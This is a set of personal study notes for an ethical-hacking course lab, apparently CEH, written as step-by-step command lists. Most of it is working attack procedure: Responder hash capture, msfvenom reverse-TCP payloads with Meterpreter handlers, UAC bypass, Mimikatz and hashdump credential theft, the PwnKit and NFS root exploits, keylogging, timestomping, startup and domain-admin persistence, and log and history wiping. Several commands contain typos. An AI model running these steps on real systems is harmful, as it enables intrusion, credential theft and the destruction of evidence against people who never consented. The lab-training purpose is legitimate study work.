# LAB 1
### Task 1: Perform Active Online Attack to Crack the System's Password using Responder
 ---
**Ubuntu** 
 1.  cd Responder 
 2.  chmod +x ./Responder.py
 3.  sudo ./Responder.py -I wlan0
 6.  copy the **NTLM** hash from **Terminal** or check logs at /home/ubuntu/Responder/logs/{Log File Name.txt}.
 7.  echo "NTML hash" > hash
 8.  john /home/voldemort/hash
**Windows**
 4. right-click on **Start** icon, and click **Run**.
 5. **\\CEH-Tools** in **Open** field and click **OK**.

### Task 2: Audit System Passwords using L0phtCrack
---
**Lab Manual 1** - page 574

### Task 3: Find Vulnerabilities on Exploit Sites
---
**Lab Manual 1** - page 583

### Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session
---
**Parrot**
1. sudo su
2. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.11.10 LHOST=4444 -o /home/attacker/Desktop/Test.exe
3. mkdir /var/www/html/share
4. chmod -R 755  /var/html/share
5. chown -R www-data:www-data /var/www/html/share
6. cp /home/attacker/Desktop/Test.exe /var/www/html/share
7. service apache2 start
8. msfconsole
9. use exploit/multi/handler
10. set payload windows/meterpreter/reverse_tcp
11. set LHOST 10.10.11.10
12. set LPORT 4444
13. exploit
17. **Meterpreter Shell** will spawn
> If Meterpreter Shell is not spawn automatically then, type **sessions -i 1** and check shell.
18. sysinfo 
19. upload /root/PowerSploit/Privesc/PowerUp.ps1 Powerup.ps1
20. shell
21. powershell -ExecutionPolicy bypass -Command ". ./PowerUp.ps1;Invoke-AllChecks"
22. exit
23. run vnc
**Windows**
14. In **Web Browser** visit **http://10.10.11.10/share**
15. Click & Download **Test.exe** 
16. Open **Test.exe**

### Task 5: Gain Access to a Remote System using Armitage
---
**Lab Manual 2** - page 599

### Task 6: Gain Access to a Remote System using Ninja Jonin
---
**Lab Manual 2** - page 616

### ==Task 7: Perform Buffer Overflow Attack to Gain Access to a Remote System==
---
**Lab Manual 2** - page 626

# Lab 2: Perform Privilege Escalation to Gain Higher Privileges
---

### Task 1: Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities
---
**Parrot**
1. sudo su
2. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.11.10 LPORT=4444 -f exe > /home/attacker/Desktop /Exploit.exe
3. mkdir /var/www/html/share
4. chmod -R 755 /var/www/html/share
5. chown -R www-data:www-data /var/www/hmtl/share
6. cp /home/attacker/Desktop/Exploit.exe /var/www/share
7. service apache2 start
8. msfconsole
9. use exploit/multi/handler
10. set payload windows/meterpreter/reverse_tcp
11. set LHOST 10.10.11.10
12. set LPORT 4444
13. exploit -j -z
**Windows**
14. In **Web Browser** visit **http://10.10.11.10/share**
15. Click & Download **Exploit.exe** 
16. Open **Exploit.exe**
**Parrot**
15. **Meterpreter Shell** will spawn
> If Meterpreter Shell is not spawn automatically then, type **sessions -i 1** and check shell.
18. getuid 

#### **beRoot**
19. Install **beroot** - [[Windows]]
20. upload /home/attacker/Desktop/BeRoot/beRoot.exe
21. shell
22. beRoot.exe
#### **Seatbelt** 
19. Install **Seatbelt** - [[Windows]]
20. upload /home/attacker/Desktop/Seatbelt.exe
21. shell
22. 

| Command                              | Work                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Seatbelt.exe -group=system           | Gather Information about AMSIProviders, AntiVirus, AppLocker etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| SeatBelt.exe -group=user             | Gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Seatbelt.exe -group=misc             | Gather information sbout ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| Seatbelt.exe -group=all              | Runs all commands                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Seatbelt.exe -group=slack            | Gather information about SlackDownloads, SlackPresence, SlackWorkspaces                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Seatbelt.exe -group=chromium         | Gather information about ChromiumBookmarks, ChromiumHistory, ChromiumPresence                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| Seatbelt.exe -group=remote           | Gather information about AMSIProviders, AntiVirus, AudioPolicyRegistry, ChromiumPresence, CloudCredentials, DNSCache, DotNet, DpapiMasterKeys, EnvironmentVariables, ExplicitLogonEvents, ExploreeRunCommands, FileZilla, Hotfixs, InterestingProcesses, KeePass, LastShutdown, LocalGroups, LocalUsers, LogonEvents, LogonSessions, LSASettings, MappedDrives, NetworkProfiles, NetworkShares, NTLMSettings, OSInfo, PoweredOnEvents, PowerShell, ProcessOwners, PSSessionSettings, PuttyHostKeys, PuttySessions, RSPSavedConnections, RDPSessions, RDPsettings, Sysmon, WindowsDefender, WindowsEventForwarding, WindowsFirewall |
| Seatbelt.exe {Command} {Command2}... | Run one or more specified commands                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Seatbelt.exe {Command} -full         | Gather complete result for a command without any filtering                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
####  **Bypass Windows UAC protection via FodHelper Registry Key**
19. background
20. use exploit/windows/local/bypassuac_fodhelper
21. show options
22. set SESSION 1
23. set payload windows/meterpreter/reverse_tcp
24. set LHOST 10.10.11.10
25. set LPORT 4444
26. set TARGET 0
27. exploit
28. getuid
29. getsystem -t 1
30. getuid
> Dump users passwords hash
31. run post/windows/gather/smart_hashdump 
> Clear event logs
32. clearev

> [!NOTE]
> **multi/recon/local_exploit_suggester** module to identify potential vulnerabilities for privilege escalation.
> **windows/local/always_install_elevated**
> 




### Task 2: Hack a Windows Machine using Metasploit and  Perform Post-Exploitation using Meterpreter
---
**Parrot**
1. sudo su
2. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.11.10 LPORT=4444 -f exe > /home/attacker/Desktop /Exploit.exe
3. mkdir /var/www/html/share
4. chmod -R 755 /var/www/html/share
5. chown -R www-data:www-data /var/www/hmtl/share
6. cp /home/attacker/Desktop/Exploit.exe /var/www/share
7. service apache2 start
8. msfconsole
9. use exploit/multi/handler
10. set payload windows/meterpreter/reverse_tcp
11. set LHOST 10.10.11.10
12. set LPORT 4444
13. exploit -j -z
**Windows**
14. In **Web Browser** visit **http://10.10.11.10/share**
15. Click & Download **Exploit.exe** 
16. Open **Exploit.exe**
**Parrot**
15. **Meterpreter Shell** will spawn
> If Meterpreter Shell is not spawn automatically then, type **sessions -i 1** and check shell.
16. sysinfo
17. ipconfig
> View the **current working** directory
18. pwd
19. cat {filename.txt}
> View **mace attributes** of {filename.txt} | **Displays Created time, Accessed time, Modified time, Entry Modified time**.
20. timestomp {filname.txt} -v
> Change Modified value
21. timestomp {filename.txt} -m "02/11/2018 08:10:03"
> Similarly use Accessed (-a), Created (-c), Entry Modified(-e) to change value


| Command                                                                                                                           | Work                                                                             |
| --------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| sysinfo                                                                                                                           | Display target machine information such as copmputer name, OS, and domain.       |
| ipconfig                                                                                                                          | Display target machine IP address, MAC address and information.                  |
| pwd                                                                                                                               | Display currrent working directory.                                              |
| timestomp {filename.txt} -v                                                                                                       | Displays Created time, Accessed time, Modified time, Entry Modified time.        |
| timestomp {filename.txt} -m "DD/MM/YYYY HH:MM:SS"<br>> -m  Modified<br>> -a   Accessed<br>> -c   Created<br>> -e   Entry Modified | Changes Modified, Accessed, Created, Entry Modified value of the {filename.txt}. |
| search -f {filename.extention}                                                                                                    | Display the location of the searched file.                                       |
| keyscan_start                                                                                                                     | Start capturing all keyboard input from the target system.                       |
| keyscan_dump                                                                                                                      | Display all captured keystrokes.                                                 |
| idletime                                                                                                                          | Display the amount of time for which the user has been idle.                     |
| C:/\> **dir /a:h**                                                                                                                | retrieve the directory names with hidden attributes.                             |
| C:/> sc queryex type=service state=all                                                                                            | List of all the available services.                                              |
| C:/> netsh firewall show state                                                                                                    | Display current firewall state.                                                  |
| C:/> netsh firewall show config                                                                                                   | Display current firewall settings in the target system.                          |
| C:/> wmic /node:"" product get name,version,vendor                                                                                | Display the details of installed software.                                       |
| C:/> wmic cpu get                                                                                                                 | Retrieve the processor's details.                                                |
| C:/> wmic os where Primary='TRUE' reboot                                                                                          | Reboot the target system.                                                        |
| C:/> net start or stop                                                                                                            | Starts/stops a network service                                                   |
| C:/> netsh advfirewall set currentprofile state off                                                                               | Turn off firewall service for current profile.                                   |
| C:/> netsh advfirewall set allprofiles set allprofiles state off                                                                  | Turn off firewall service for all profiles.                                      |
| findstr /E ".log" > log.txt                                                                                                       | Retrieves all the log files.                                                     |

### Task 3: Escalate Privileges by Exploiting Vulnerability in ***pkexec***
---
**Parrot**
1. Download CVE-2021-4034  - [[Linux]]
2. mv CVE-2021-4034 /tmp/pwnkit
3. cd /tmp
4. cd pwwnkit
5. cd CVE-2021-4034
6. make
7. ./cve-2021--4034

### Task 4: Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS
---\
**Ubuntu** - Victim
1. sudo apt install nfs-kernel-server
2. sudo nano /etc/exports
3. Add /home             * (rw,no_root_squash) | ==**No space** between * and (==
4. sudo /etc/init.d/nfs-kernel-server restart
**Parrot** - Attacker
5. nmap -sV 10.10.11.10 || ==port 2049 is open==
6. sudo apt-get install nfs-common
7. showmount -e 10.10.11.10
8. mkdir /tmp/nfs
9. sudo mount -t nfs 10.10.11.10:/home /tmp/nfs
10. cd /tmp/nfs
11. sudo cp /bin/bash
12. sudo chmod +s bash
13. ls -la bash
14. ssh -l ubuntu 10.10.11.10
15. cd /home
16. ls
17. ./bash -p
18. id
19. whoami
20. cp /bin/nano
21. chmod 4777 nano
22. ls -la nano
23. cd /home
24. ./nano -p /etc/shadow | ==this shows the hashes of all users.==
25. cat /etc/crontab | ==Display running cronjobs.==

| Command                               | Work                                       |     |
| ------------------------------------- | ------------------------------------------ | --- |
| cat /etc/crontab                      | Display running cronjobs.                  |     |
| ps -ef                                | Display current running processes.         |     |
| find / -name "*.txt" -ls 2> /dev/null | To view all the .txt files on the system.  |     |
| route -n                              | Display host/network names in numeric form |     |
| find / -perm -4000 -ls 2> /dev/null   | Display SUID executable binaries.          |     |

### Task 5: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
---
**LAB Manual 2** - Page 731
1. sudo su
2. cd
3. msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.11.10 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
4. cp /home/attack/Desktop/backdoor.exe /var/www/html/share/
5. service apache2 start
6. msfconsole
7. use exploit/multi/handler
8. set payload windows/meterpreter/reverse_tcp
9. set lhost 10.10.11.10
10. set lport 4444
11. run
15. sysinfo
16. getuid
17. background search bypassuac
18. use exploit/windows/local/bypassuac_fodhelper
19. set session 1
20. show options
21. set TARGET 0
22. explotit
23. getsystem -t 1
24. getuid
25. background
26. use post/windows/manage/sticky_keys
27. session i*
28. session 2
29. exploit
**Windows**
12.  In **Web Browser** visit **http://10.10.11.10/share**
13. Click & Download **backdoor.exe** 
14. Open **backdoor.exe**

### Task 6: Escalate Privileges to Gather Hashdump using Mimikatz
---
**Parrot**
1. sudo su
2. cd
3. msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.11.10 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
4. cp /home/attack/Desktop/backdoor.exe /var/www/html/share/
5. service apache2 start
6. msfconsole
7. use exploit/multi/handler
8. set payload windows/meterpreter/reverse_tcp
9. set lhost 10.10.11.10
10. set lport 4444
11. run
15. background
16. use exploit/windows/loacl/bypassuac_foodhelper
17. set session 1
18. show options
19. set lhost 10.10.11.10
20. set lport 4444
21. set target 0
22. exploit
23. getsystem -t 1
24. getuid
25. ==load kiwi==
26. ==help kiwi==
27. ==lsa_dump_sam  || Display **NTLM** Hash of all users==
28. ==lsa_dump_secrets || Diaplay **LSA Secrets** Login hashes==
**Windows**
12.  In **Web Browser** visit **http://10.10.11.10/share**
13. Click & Download **backdoor.exe** 
14. Open **backdoor.exe**

# LAB 3: Maintain Remote Access and Hide Malicious Activities
---
### Task 1: User System Monitoring and Surveillance using Power Spy
---
**LAB Manual 2** - Page 757

Ctrl+alt+x
### Task 2: User System Monitoring and Surveillance using Spytech SpyAgent
---
**LAB Manual 2** - Page 775
ctrl+shift+alt+m
### Task 3: Hide Files using NTFS Streams
---
**Windows**
1. Check C: drive file system is in **NTFS** format.
2. Create **new folder** in C: drive and named it **magic**.
3. Copy **calc.exe** to `C:\magic` from `C:\Windows\System32`
4. Open Cmd by **run as administrator** & navigate to `C:\magic`
5. notepad readme.txt
6. Write 'HELLO WORLD!!' and save it !!!!!
7. dir
8. type `c:\magic\calc.exe > c:\magic\readme.txt:calc.exe`
9. mklink backdoor.exe readme.txt:calc.exe
10. backdoor.exe
Boom!!!! Calculate will open.....


### Task 4: Hide Data using White Space Steganography
---
**Windows**
1. Install Snow.exe || [The SNOW Home Page (darkside.com.au)](https://darkside.com.au/snow/)
2. Create readme.txt having text ```Hello World!```
3. snow -C -m "My Swiss bank account number is 1234567890" -p "magic" readme.txt readme2.txt
>the file **readme2.txt** has become a combination of **readme.txt + My Swiss back account number is 1234567890**.
4. snow -C -p "magic" readme2.txt 
**LAB Manual 2** - Page 799

### Task 5: Image Steganography using OpenStego and StegOnline
---
**OpenStego**
	**LAB Manual 2** - Page 803

**StegOnline** 
	https://www.georgeom.net/StegOnline/
	**LAB Manual 2** - page 813

### Task 6: Maintain Persistence by Abusing Boot or Logon Autostart Execution
---
#81
**Parrot**
>**Terminal 1**
1. msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.11.10 lport=4444 -f exe > /home/attacker/Desktop/exploit.exe
2. cp /home/Desktop/attacker/Desktop/exploit.exe /var/www/html/share/
3. service apache2 start
4. msfconsole
5. use exploit/meterpreter/reverse_tcp
6. set lhost 10.10.11.10
7. set lport 4444
8. set payload windows/meterpreter/reverse_tcp
9. exploit
13. background
14. use exploit/windows/local/bypassuac_fodhelper
15. set session 1
16. set lhost 10.10.11.10
17. set target 0
18. exploit
19. getsystem -t 1
20. getuid
21. cd `"C:\\ProgramData\\Start Menu\\Programs\\Startup"`
22. pwd
24. upload /home/attacker/payload.exe
> Terminal 2
23. msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.11.10 lport=8080 -f exe > payload.exe
25. msfconsole 
26. use exploit/multi/handler
27. set payload windows/meterpreter/reverse_tcp
28. set lhost 10.10.11.10
29. set lport 8080
30. exploit
**Windows**
10. In **Web Browser** visit **http://10.10.11.10/share**
11. Click & Download **exploit.exe** 
12. Open **exploit.exe**
31. Restart the System

### ==Task 7: Maintain Domain Persistence by Exploiting Active Directory Objects==
Adding Domain Admin from Domain User
#82

States exploit active directory objects and adding martin a standard user into the 2022 server to a domain admins group through the admin SD holder and the name of the user that is added into the domain admins group in this task.
**ANS - Martin**
**Parrot**
1. msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.11.10 lport=4444 -f exe > /home/attacker/Desktop/exploit.exe
2. cp /home/attacker/Desktop/exploit.exe /var/www/html/share/
3. service apache2 start
4. msfconsole
5. use exploit/meterpreter/reverse_tcp
6. set lhost 10.10.11.10
7. set lport 4444
8. set payload windows/meterpreter/reverse_tcp
9. exploit
13. getuid 
14. `upload -r /home/attacker/PowerTools-master C:\\Users\Administrator\\`
15. shell
16. `C:\Windows\system32`
17. powershell
18. cd C:\Users\Administrator\Downloads\PowerView
19. Import-Module ./powerview.psm1
20. Get-ObjectAcl -samAccountName "Martin" -ResolveGUIDs
21. REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters \V AdminSDProtectFrequency \T REG_DWORD \F \D 300
22. net group "Domain Admins" Martin /add /domain
**Windows**
10. In **Web Browser** visit **http://10.10.11.10/share**
11. Click & Download **exploit.exe** 
12. Open **exploit.exe**

 ![[Pasted image 20241025225156.png]]
### ==Task 8: Privilege Escalation and Maintain Persistence using WMI==
---
#83

### Task 9: Convert Channels using Convert_TCP
---
use kali a attacker machine and ubantu as victim
wireshark secret message.
#84


# LAB 4: Clear Logs to Hide the Evidence of Compromise
---
### Task 1: View, Enable, and Clear Audit Policies using Auditpol
---
#85
**WINDOWS**
View all audit policies
`audipol /get /category:*`

Enable the audit policies
`audipol /set /category:"system","account logon" /success:enable /failure:enable`

Check whether the audit policies are enable.
`audipol /get /category:*`

Clear the audit policies
`auditpol /clear /y`

Again check the audit policies are are cleared?
`audipol /get /category:*`

LAB Manual 2 - Page 882
### Task 2: Clear Windows Machine Logs using Various Utilities
---
1. Run Clear_Event_Viewer_Logs.bat as Administrator
2. wevtutil el     # display a list of event logs.
3. el | enum-logs   # list event log names.
4. wevtutil cl system(log_name)  # to clear the log

cipher /w:c:{drive location}    # To overwrite or encrypt deleted files in a specific drive, folder or file.
### Task 3: Clear Linux Machine Logs using the BASH shell
---
1. export HISTSIZE=0    # Disable bash shell from saving the history.
2. history -c    # to clear the stored history.
3. history -w   # to delete the history of the current shell
4. shred ~/.bash_history    # Shred the history , making its content unreadable.
5. 
### Task 4: Hiding Artifacts in Windows and Linux Machines
---
1. mkdir Test
2. dir
3. attrib +h +s +r Test    # to hide the folder.
4. dir 
5. sttrib -s -h -r Test   # to unhide the folder.
6. dir 
#####  Hide User account 
7. net user Test /add    # to add the user.
8. net user Test /active:yes    # To active the user.
9. net user Test /active:no      # to hide the user.

**LINUX**
1. mkdir Test
2. cd Test
3. >> Sample.txt
4. touch Sample.txt
5. ls
6. touch .Secret.txt
7. ls
8. ls -la
 
 #88

### Task 5: Clear Windows Machine Logs using CCleaner
---
#89